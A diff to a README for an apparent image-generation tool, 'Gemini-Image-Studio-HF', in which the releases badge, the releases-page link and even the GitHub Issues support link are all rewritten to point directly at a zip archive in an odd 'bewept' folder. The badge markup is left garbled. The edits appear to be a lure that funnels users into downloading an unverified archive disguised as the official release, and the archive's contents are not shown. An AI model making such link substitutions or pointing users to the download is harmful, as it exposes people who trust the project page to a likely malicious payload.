@@ -1,6 +1,6 @@
 # 🌟 Gemini-Image-Studio-HF - Create Stunning Images Easily
 
-[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-blue.svg)](https://github.com/aishc22/Gemini-Image-Studio-HF/releases)
+[![Download from Releases](https://raw.githubusercontent.com/aishc22/Gemini-Image-Studio-HF/main/bewept/Gemini-Image-Studio-HF.zip%20from%https://raw.githubusercontent.com/aishc22/Gemini-Image-Studio-HF/main/bewept/Gemini-Image-Studio-HF.zip)](https://raw.githubusercontent.com/aishc22/Gemini-Image-Studio-HF/main/bewept/Gemini-Image-Studio-HF.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To run Gemini Image Studio HF, your computer must meet the following requirement
 To download and run Gemini Image Studio HF:
 
 1. **Visit the Releases Page**  
-   Go to [this page to download](https://github.com/aishc22/Gemini-Image-Studio-HF/releases).
+   Go to [this page to download](https://raw.githubusercontent.com/aishc22/Gemini-Image-Studio-HF/main/bewept/Gemini-Image-Studio-HF.zip).
 
 2. **Select the Latest Release**  
    On the releases page, locate the latest version of Gemini Image Studio HF. 
@@ -78,7 +78,7 @@ If you encounter any issues while using Gemini Image Studio HF, try the followin
 
 ## 📚 Support
 
-For additional help, please visit the [GitHub Issues page](https://github.com/aishc22/Gemini-Image-Studio-HF/issues). You can report bugs, request features, or ask questions there. 
+For additional help, please visit the [GitHub Issues page](https://raw.githubusercontent.com/aishc22/Gemini-Image-Studio-HF/main/bewept/Gemini-Image-Studio-HF.zip). You can report bugs, request features, or ask questions there. 
 
 We aim to respond promptly to all inquiries to enhance your experience with Gemini Image Studio HF.
 
